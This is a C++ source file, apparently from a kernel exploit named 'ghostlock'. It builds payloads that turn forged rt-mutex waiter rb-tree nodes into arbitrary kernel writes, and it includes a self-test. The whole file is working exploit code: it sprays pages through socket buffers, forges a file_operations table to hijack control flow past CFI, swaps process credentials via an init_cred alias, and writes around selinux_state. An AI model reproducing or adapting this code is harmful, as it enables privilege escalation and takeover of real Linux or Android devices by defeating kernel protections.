#include "memory/payload_builder.h"

#include <cstring>

#include <algorithm>
#include <array>
#include <cstddef>
#include <iterator>
#include <span>

using namespace ghostlock;

namespace {
    /* One payload chunk: `prepare_skb_payload` writes the page as
     * `SKB_SEND_SIZE / this` identical chunks, and the base address the spray
     * reports is the first one. The forged fops table must live inside that
     * first chunk, so `PayloadWriteLayout::value` is bounds-checked against it.
     * The value is `kernel::ORDER3_SIZE`; it is repeated here because this unit
     * (and its host test) deliberately stays free of the per-device target
     * header, which `kernel/constants.hpp` pulls in. */
    constexpr uintptr_t kPayloadChunkBytes = 0x8000;
    static_assert(kPayloadChunkBytes == (4096U << 3));

    /* Direct-map bounds. Repeated here for the same reason as the chunk size:
     * this unit (and its host test) stays free of the per-device target header,
     * which `kernel/constants.hpp` pulls in via TARGET_CONFIG_H. The acceptance
     * checks that used to live in the callers (`attack::in_direct_map`) are
     * duplicated for the modes whose page-derived word reaches kernel memory. */
    constexpr uintptr_t kDirectMapBase = 0xffffff8000000000ULL;
    constexpr uintptr_t kDirectMapEnd = 0xffffff9000000000ULL;

    [[nodiscard]] constexpr bool payload_in_direct_map(uintptr_t address) noexcept {
        return address > kDirectMapBase && address < kDirectMapEnd;
    }

    void store64(unsigned char *p, size_t off, uint64_t value) {
        memcpy(p + off, &value, sizeof(value));
    }

    uint64_t load64(const unsigned char *p, size_t off) {
        uint64_t value;
        memcpy(&value, p + off, sizeof(value));
        return value;
    }

    bool span_store64(std::span<std::byte> bytes, size_t offset,
                      uint64_t value) noexcept {
        if (offset > bytes.size() || sizeof(value) > bytes.size() - offset) {
            return false;
        }
        memcpy(bytes.data() + offset, &value, sizeof(value));
        return true;
    }
} // namespace

namespace ghostlock::memory {
    bool encode_compact_waiter(std::span<std::byte> waiter,
                               const WriteRequest &request,
                               const PayloadWriteLayout &layout) noexcept {
        if (waiter.size() < kCompactWaiterBytes) return false;
        /* Fops / Value only exist in the 6.6 non-compact three-word layout,
         * which `support::prepare_skb_payload` writes directly: their `pc` is
         * the node's own `rb_parent_color` field (+0x28 of the waiter), not the
         * word this compact arm stores at +0x18. Encoding one here would store
         * the branch node address into the destination instead of the requested
         * word, so refuse loudly rather than silently mis-write. */
        if (request.mode == WriteMode::Fops || request.mode == WriteMode::Value) {
            return false;
        }
        if (layout.right) {
            return span_store64(waiter, 0x18, layout.right) &&
                   span_store64(waiter, 0x20, 0) &&
                   span_store64(waiter, 0x28, request.target);
        }
        return span_store64(waiter, 0x18, layout.parent) &&
               span_store64(waiter, 0x20, layout.right) &&
               span_store64(waiter, 0x28, layout.left);
    }

    bool encode_multicast_waiter(std::span<std::byte> buffer,
                                 size_t waiter_offset, size_t task_offset, size_t lock_offset,
                                 uintptr_t fake_task, uintptr_t fake_lock) noexcept {
        return span_store64(buffer, waiter_offset + task_offset, fake_task) &&
               span_store64(buffer, waiter_offset + lock_offset, fake_lock);
    }

    PayloadWriteLayout payload_write_layout(
        const WriteRequest *request, uintptr_t page_base,
        uintptr_t default_fops, uintptr_t credential_fops,
        uintptr_t init_cred_alias) {
        PayloadWriteLayout layout = {
            .fops = default_fops,
        };
        if (!request || request->mode == WriteMode::Disabled) return layout;

        if (request->mode == WriteMode::Fops) {
            /* CFI hijack (design D1/D2): the erase node must take the brand-new
             * "child == NULL, left != NULL" arm of __rb_erase_augmented, which
             * stores node->__rb_parent_color into *(node->rb_left). So the node
             * carries parent = the word to write and left = the destination,
             * and must have right == 0: a non-NULL right child would divert the
             * erase into the successor cases and store the wrong word at the
             * wrong place. The arm's second, unavoidable store lands at
             * value - 8, which is still inside the page we own. */
            layout.chunk_offset = kFakeFopsTableOffset;
            layout.value = page_base + kFakeFopsTableOffset;
            layout.parent = layout.value;
            layout.right = 0;
            layout.left = request->target;
            return layout;
        }

        if (request->mode == WriteMode::Value) {
            /* The word to store rides the erase node's `rb_parent_color`, which
             * is also the field that decides the node's colour: the arm that
             * stores it is only taken when the node is RED. rb_parent() masks
             * bit 0 off before using the word as a pointer, and the erase arm
             * stores `pc` with that same mask applied, so forcing bit 0 to 1 is
             * what makes the stored word come out exactly as requested.
             * `rb_left` carries the destination through the right!=0 compact
             * arm (pc = value, left = target). */
            layout.value = request->value | 1U;
            layout.parent = layout.value;
            layout.right = page_base + 0x100;
            layout.left = request->target;
            return layout;
        }

        if (request->preserve_child) {
            layout.right = request->mode == WriteMode::Credential
                               ? init_cred_alias
                               : page_base + 0x100;
        }
        if (request->mode == WriteMode::Credential) {
            layout.fops = credential_fops;
            layout.needs_credential_copy = true;
        }
        layout.parent = request->target - 8;
        return layout;
    }

    void build_compact_waiter_payload(
        unsigned char *waiter, const WriteRequest *request,
        const PayloadWriteLayout *layout) {
        if (!waiter || !request || !layout) return;
        (void) encode_compact_waiter(
            {
                reinterpret_cast<std::byte *>(waiter),
                kCompactWaiterBytes
            },
            *request, *layout);
    }

    int32_t payload_write_layout_matches_request(
        const WriteRequest *request, const PayloadWriteLayout *layout) {
        if (!request || !layout || request->mode == WriteMode::Disabled) return 0;
        if (request->mode == WriteMode::Fops) {
            /* right must be 0 (the left-child erase arm) and both the carried
             * word and the destination must be non-zero, so a malformed Fops
             * request is rejected before a page is sprayed. */
            return layout->right == 0 && layout->value != 0 && layout->left != 0;
        }
        if (request->mode == WriteMode::Value) {
            /* right != 0 selects the compact arm that stores `value`; the value
             * must be the requested word with the forced colour bit, and `right`
             * is the branch node the payload puts at page_base + 0x100, so it
             * has to be a usable direct-map address rather than anything from
             * the caller. Nothing from `right` is ever loaded as data. */
            if (!payload_in_direct_map(layout->right)) return 0;
            return layout->value == (request->value | 1U) &&
                   layout->left == request->target;
        }
        return request->preserve_child ? layout->right != 0 : layout->right == 0;
    }

    int32_t payload_write_layout_accepts_page(
        const WriteRequest *request, const PayloadWriteLayout *layout) {
        if (!payload_write_layout_matches_request(request, layout)) return 0;
        /* The forged fops table has to sit entirely inside the payload page the
         * erase node lives in, 8-byte aligned. Both are properties of the value
         * we are about to store, so they are checked here, before the write. */
        if (request->mode == WriteMode::Fops) {
            /* The forge has to land in the first `kPayloadChunkBytes` chunk: a
             * table that ran past the chunk end would only exist as a second
             * copy, while the address this write stores points at the first,
             * incomplete one. Checked against the offset the encoder recorded,
             * not against the absolute address (which cannot distinguish the
             * chunk-0 table from an identical one in a later chunk). */
            if ((layout->value & 0x7U) != 0) return 0;
            if (layout->chunk_offset != kFakeFopsTableOffset) return 0;
            if (layout->chunk_offset + kFakeFopsTableBytes > kPayloadChunkBytes) return 0;
            if ((layout->value & (kPayloadChunkBytes - 1U)) != layout->chunk_offset) return 0;
        }
        /* W1 stores its page-derived value across selinux_state fields. An even
     * byte 2 clears `initialized` and breaks every subsequent SID lookup. */
        if (request->mode == WriteMode::Zero && request->preserve_child &&
            ((layout->right >> 16) & 1) == 0)
            return 0;
        return 1;
    }

    void build_multicast_waiter_payload(
        unsigned char *buffer, size_t waiter_offset, size_t task_offset,
        size_t lock_offset, uintptr_t fake_task, uintptr_t fake_lock) {
        if (!buffer) return;
        const size_t required = waiter_offset +
                                std::max(task_offset, lock_offset) + sizeof(uint64_t);
        (void) encode_multicast_waiter(
            {reinterpret_cast<std::byte *>(buffer), required}, waiter_offset,
            task_offset, lock_offset, fake_task, fake_lock);
    }

    int32_t payload_builder_fixed_vector_test(void) {
        /* The CFI hijack arm has no prior art in these vectors: it is the only
         * mode whose stored word is neither the target nor a page-derived right
         * word, so it carries its own assertions. */
        {
            constexpr uintptr_t page = 0xffffff8800210000ULL;
            constexpr uintptr_t misc_fops = 0xffffff800226b4e8ULL;
            const WriteRequest fops = WriteRequest::make(
                misc_fops, WriteMode::Fops, false);
            PayloadWriteLayout fops_layout = payload_write_layout(
                &fops, page, 0x1111, 0x2222, 0xffffff802abfd588ULL);
            const uintptr_t fake = page + kFakeFopsTableOffset;
            if (fops_layout.value != fake || fops_layout.parent != fake) return 0;
            if (fops_layout.right != 0 || fops_layout.left != misc_fops) return 0;
            /* These three words reach the payload through the 6.6 non-compact
             * path (`support::prepare_skb_payload`), which stores them straight
             * into the waiter's `pi_tree.entry`: rb_parent_color = the word to
             * store, rb_right = 0, rb_left = the destination. That path is not
             * reachable from a host test, so assert on the layout, and assert
             * that the compact arm refuses the mode rather than mis-encoding it
             * at its own +0x18 word. */
            std::array<unsigned char, kCompactWaiterBytes> compact_probe{};
            if (encode_compact_waiter(
                    {reinterpret_cast<std::byte *>(compact_probe.data()),
                     compact_probe.size()},
                    fops, fops_layout))
                return 0;
            if (!payload_write_layout_matches_request(&fops, &fops_layout)) return 0;
            if (!payload_write_layout_accepts_page(&fops, &fops_layout)) return 0;
            /* A table that spills out of the first ORDER3 chunk, or a zero
             * destination, must be refused rather than written. 0x8000 lands
             * exactly on the next chunk's boundary, the last offset that still
             * leaves room for the whole table. */
            /* A table that is not the one the encoder chose, or that would run
             * past the end of the sprayed chunk, must be refused rather than
             * written. */
            PayloadWriteLayout spilled = fops_layout;
            spilled.chunk_offset = kPayloadChunkBytes - kFakeFopsTableBytes + 8;
            spilled.value = page + spilled.chunk_offset;
            spilled.parent = spilled.value;
            if (payload_write_layout_accepts_page(&fops, &spilled)) return 0;
            PayloadWriteLayout moved = fops_layout;
            moved.chunk_offset = kFakeFopsTableOffset + 0x40;
            moved.value = page + moved.chunk_offset;
            moved.parent = moved.value;
            if (payload_write_layout_accepts_page(&fops, &moved)) return 0;
            PayloadWriteLayout fits = fops_layout;
            fits.chunk_offset = kPayloadChunkBytes - kFakeFopsTableBytes;
            fits.value = page + fits.chunk_offset;
            fits.parent = fits.value;
            if (payload_write_layout_accepts_page(&fops, &fits)) return 0;
            const WriteRequest zero_dest = WriteRequest::make(
                0, WriteMode::Fops, false);
            PayloadWriteLayout zero_layout = payload_write_layout(
                &zero_dest, page, 0x1111, 0x2222, 0);
            if (payload_write_layout_matches_request(&zero_dest, &zero_layout)) return 0;
        }

        /* WriteMode::Value: the stored word is the caller's, with the colour
         * bit forced on in the payload and masked off again by the erase. */
        {
            constexpr uintptr_t page = 0xffffff8800210000ULL;
            constexpr uintptr_t dest = 0xffffff8012345628ULL;
            /* A realistic vr.ko tag word: low byte carries the tag, bit 0 of the
             * word is clear, so the forcing is actually exercised. */
            constexpr uintptr_t flags_word = 0x0000000000006802ULL;
            const WriteRequest value_write = WriteRequest::make_value(dest, flags_word);
            PayloadWriteLayout value_layout = payload_write_layout(
                &value_write, page, 0x1111, 0x2222, 0);
            /* 6.6 non-compact layout: the erase node's `rb_parent_color` field
             * (+0x28 of the waiter) is the word that gets stored. */
            if (value_layout.right == 0) return 0;
            if (value_layout.value != (flags_word | 1U)) return 0;
            if (value_layout.parent != (flags_word | 1U)) return 0;
            if (value_layout.left != dest) return 0;
            if (!payload_write_layout_matches_request(&value_write, &value_layout)) return 0;
            if (!payload_write_layout_accepts_page(&value_write, &value_layout)) return 0;
            /* Every bit of the caller's word survives except the forced one, and
             * the forced one is what rb_parent() drops. */
            if ((value_layout.value & ~1ULL) != flags_word) return 0;
            /* The compact arm must refuse this mode: it would store the branch
             * node address instead of the requested word. */
            std::array<unsigned char, kCompactWaiterBytes> compact_probe{};
            if (encode_compact_waiter(
                    {reinterpret_cast<std::byte *>(compact_probe.data()),
                     compact_probe.size()},
                    value_write, value_layout))
                return 0;
            /* Zero is a legal thing to store (that is WriteMode::Zero's job, but
             * Value must not silently refuse it either). */
            const WriteRequest zero_value = WriteRequest::make_value(dest, 0);
            PayloadWriteLayout zero_write_layout = payload_write_layout(
                &zero_value, page, 0x1111, 0x2222, 0);
            if (!payload_write_layout_matches_request(&zero_value, &zero_write_layout))
                return 0;
        }

        static const struct {
            uintptr_t target;
            WriteMode mode;
            int32_t leaf;
            uintptr_t expected_pc;
            uintptr_t expected_left;
        } vectors[] = {
            {
                0xffffff8000123000ULL, WriteMode::Zero, 1,
                0xffffff8000122ff8ULL, 0
            },
            {
                0xffffff8000124000ULL, WriteMode::Zero, 0,
                0xffffff8800210100ULL, 0xffffff8000124000ULL
            },
            {
                0xffffff8000125000ULL, WriteMode::Credential, 0,
                0xffffff802abfd588ULL, 0xffffff8000125000ULL
            },
        };
        const uintptr_t page = 0xffffff8800210000ULL;
        const uintptr_t init_cred = 0xffffff802abfd588ULL;
        for (size_t i = 0; i < std::size(vectors); ++i) {
            std::array<unsigned char, kCompactWaiterBytes> current{};
            const WriteRequest request = WriteRequest::make(
                vectors[i].target, vectors[i].mode, vectors[i].leaf != 0);
            PayloadWriteLayout layout = payload_write_layout(
                &request, page, 0x1111, 0x2222, init_cred);
            build_compact_waiter_payload(current.data(), &request, &layout);
            if (load64(current.data(), 0x18) != vectors[i].expected_pc ||
                load64(current.data(), 0x20) != 0 ||
                load64(current.data(), 0x28) != vectors[i].expected_left ||
                !payload_write_layout_matches_request(&request, &layout) ||
                !payload_write_layout_accepts_page(&request, &layout))
                return 0;
        }
        const WriteRequest w1 = WriteRequest::make(
            0xffffff8000124000ULL, WriteMode::Zero, false);
        PayloadWriteLayout rejected = payload_write_layout(
            &w1, 0xffffff8800200000ULL, 0x1111, 0x2222, init_cred);
        if (payload_write_layout_accepts_page(&w1, &rejected)) return 0;
        rejected.right = 0;
        if (payload_write_layout_matches_request(&w1, &rejected)) return 0;

        std::array < unsigned char, 0x80 > legacy_stamp{};
        std::array < unsigned char, 0x80 > current_stamp{};
        store64(legacy_stamp.data(), 0x20 + 0x28, 0xffffff8800005800ULL);
        store64(legacy_stamp.data(), 0x20 + 0x30, 0xffffff8800001000ULL);
        build_multicast_waiter_payload(
            current_stamp.data(), 0x20, 0x28, 0x30,
            0xffffff8800005800ULL, 0xffffff8800001000ULL);
        if (memcmp(legacy_stamp.data(), current_stamp.data(),
                   legacy_stamp.size()) != 0)
            return 0;
        std::byte undersized[0x2f]{};
        if (encode_compact_waiter(undersized, w1, rejected)) return 0;
        /* Multicast geometry that would run past the supplied span is rejected
     * instead of written out of bounds. */
        std::array<std::byte, 0x40> multicast_small{};
        if (encode_multicast_waiter(
            multicast_small, 0x20, 0x28, 0x30, 0x1111, 0x2222))
            return 0;
        return 1;
    }
} // namespace ghostlock::memory
